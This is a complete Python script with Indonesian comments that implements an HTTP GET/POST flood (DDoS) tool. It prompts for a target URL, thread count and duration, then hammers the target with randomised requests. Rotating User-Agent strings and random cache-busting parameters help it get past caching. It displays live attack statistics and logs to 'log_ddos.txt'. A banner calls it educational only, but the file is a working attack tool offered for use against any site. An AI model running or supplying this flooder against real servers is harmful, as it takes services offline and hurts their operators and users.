import requests
import threading
import time
import random
import string
from datetime import datetime
import sys
import os

# List User-Agent yang akan di-random
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64)',
    'Mozilla/5.0 (Linux; Android 10)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X)'
]

# Warna untuk tampilan
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def generate_random_params():
    """Buat parameter acak untuk menghindari cache"""
    params = {}
    num_params = random.randint(1, 5)
    for _ in range(num_params):
        key = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))
        value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(3, 12)))
        params[key] = value
    return params

class AttackStats:
    def __init__(self):
        self.total = 0
        self.success = 0
        self.failed = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.log_file = open('log_ddos.txt', 'a')
        self.log_file.write(f"\n\n===== NEW ATTACK STARTED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} =====\n")
        self.log_file.flush()
    
    def add_request(self, status_code):
        with self.lock:
            self.total += 1
            if 200 <= status_code < 300:
                self.success += 1
            else:
                self.failed += 1
            
            # Log ke file
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            self.log_file.write(f"[{timestamp}] Status: {status_code}\n")
            if self.total % 10 == 0:  # Flush setiap 10 request
                self.log_file.flush()
    
    def get_rps(self):
        elapsed = time.time() - self.start_time
        return self.total / elapsed if elapsed > 0 else 0
    
    def close_log(self):
        self.log_file.close()

def worker(stats, target, stop_event):
    while not stop_event.is_set():
        try:
            # Pilih metode secara acak (70% GET, 30% POST)
            method = 'GET' if random.random() < 0.7 else 'POST'
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            params = generate_random_params()
            
            if method == 'GET':
                # Untuk GET, tambahkan parameter di URL
                response = requests.get(target, params=params, headers=headers, timeout=5)
                stats.add_request(response.status_code)
            else:
                # Untuk POST, kirim parameter sebagai form data
                response = requests.post(target, data=params, headers=headers, timeout=5)
                stats.add_request(response.status_code)
                
        except Exception as e:
            stats.add_request(0)

def display_stats(stats, stop_event, target, num_threads, duration):
    print("\033[?25l", end="")  # Sembunyikan kursor
    last_total = 0
    last_time = time.time()
    
    while not stop_event.is_set():
        # Hitung RPS berdasarkan perbedaan waktu
        now = time.time()
        elapsed = now - last_time
        with stats.lock:
            current_total = stats.total
            success = stats.success
            failed = stats.failed
        
        # Hitung RPS
        rps = (current_total - last_total) / elapsed if elapsed > 0 else 0
        last_total = current_total
        last_time = now
        
        total_elapsed = time.time() - stats.start_time
        
        # Bersihkan layar dan posisikan kursor di atas
        sys.stdout.write("\033[H\033[J")
        
        # Tampilkan header dengan warna
        print(f"{Colors.BOLD}{Colors.HEADER}{'=' * 60}")
        print(" HTTP GET/POST FLOOD ATTACK ".center(60))
        print(f"{'=' * 60}{Colors.END}")
        
        # Tampilkan statistik
        print(f"{Colors.BLUE}Target     : {Colors.END}{target}")
        print(f"{Colors.BLUE}Threads    : {Colors.END}{num_threads}")
        print(f"{Colors.BLUE}Elapsed    : {Colors.END}{total_elapsed:.1f}s / {duration}s")
        print(f"{Colors.GREEN}{'-' * 60}{Colors.END}")
        print(f"{Colors.CYAN}Total Req  : {Colors.BOLD}{current_total}{Colors.END}")
        print(f"{Colors.GREEN}Successful : {Colors.BOLD}{success}{Colors.END}")
        print(f"{Colors.RED}Failed     : {Colors.BOLD}{failed}{Colors.END}")
        print(f"{Colors.YELLOW}Current RPS: {Colors.BOLD}{rps:.1f}{Colors.END}")
        print(f"{Colors.YELLOW}Avg RPS    : {Colors.BOLD}{stats.get_rps():.1f}{Colors.END}")
        print(f"{Colors.GREEN}{'-' * 60}{Colors.END}")
        
        # Animasi loading
        frames = ["🌑 ", "🌒 ", "🌓 ", "🌔 ", "🌕 ", "🌖 ", "🌗 ", "🌘 "]
        frame = frames[int(time.time() * 4) % len(frames)]
        print(f"\n{Colors.HEADER}{frame} Attacking... Press Ctrl+C to stop{Colors.END}")
        
        sys.stdout.flush()
        time.sleep(0.25)
    
    print("\033[?25h", end="")  # Tampilkan kembali kursor

if __name__ == "__main__":
    os.system("clear")
    
    # Banner dengan warna
    print(f"{Colors.BOLD}{Colors.HEADER}{'=' * 60}")
    print(" PYTHON HTTP GET/POST FLOOD TOOL ".center(60))
    print(f"{'=' * 60}{Colors.END}")
    print(f"{Colors.YELLOW}Note: Untuk tujuan edukasi dan testing saja!{Colors.END}")
    print(f"{Colors.RED}Jangan gunakan untuk aktivitas ilegal!{Colors.END}\n")
    
    # Input user
    target = input(f"{Colors.BLUE}[?] Target URL (contoh: https://example.com): {Colors.END}")
    num_threads = int(input(f"{Colors.BLUE}[?] Jumlah thread: {Colors.END}"))
    duration = int(input(f"{Colors.BLUE}[?] Durasi serangan (detik): {Colors.END}"))
    
    # Validasi target
    if not target.startswith('http'):
        print(f"{Colors.RED}Error: Target harus dimulai dengan http/https{Colors.END}")
        exit()

    # Inisialisasi statistik
    stats = AttackStats()
    stop_event = threading.Event()
    
    # Buat worker threads
    print(f"\n{Colors.YELLOW}🚀 Starting {num_threads} attack threads...{Colors.END}")
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(stats, target, stop_event))
        t.daemon = True
        t.start()
    
    # Thread untuk menampilkan statistik
    display_thread = threading.Thread(target=display_stats, 
                                     args=(stats, stop_event, target, num_threads, duration))
    display_thread.daemon = True
    display_thread.start()
    
    # Timer durasi serangan
    try:
        time.sleep(duration)
        print(f"\n{Colors.GREEN}⏰ Durasi serangan selesai!{Colors.END}")
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}🛑 Serangan dihentikan manual!{Colors.END}")
    finally:
        stop_event.set()
        time.sleep(1.5)  # Beri waktu untuk update terakhir
    
    # Tampilkan ringkasan akhir
    print(f"\n{Colors.BOLD}{Colors.HEADER}{'=' * 60}")
    print(" ATTACK SUMMARY ".center(60))
    print(f"{'=' * 60}{Colors.END}")
    print(f"{Colors.BLUE}{'Target:':<15}{Colors.END} {target}")
    print(f"{Colors.BLUE}{'Durasi:':<15}{Colors.END} {duration} detik")
    print(f"{Colors.BLUE}{'Threads:':<15}{Colors.END} {num_threads}")
    print(f"{Colors.BLUE}{'Total Request:':<15}{Colors.END} {stats.total}")
    print(f"{Colors.GREEN}{'Berhasil:':<15}{Colors.END} {stats.success}")
    print(f"{Colors.RED}{'Gagal:':<15}{Colors.END} {stats.failed}")
    print(f"{Colors.YELLOW}{'Rata-rata RPS:':<15}{Colors.END} {stats.get_rps():.1f}")
    print(f"{Colors.HEADER}{'=' * 60}{Colors.END}")
    print(f"{Colors.CYAN}Log disimpan di: log_ddos.txt{Colors.END}\n")
    
    stats.close_log()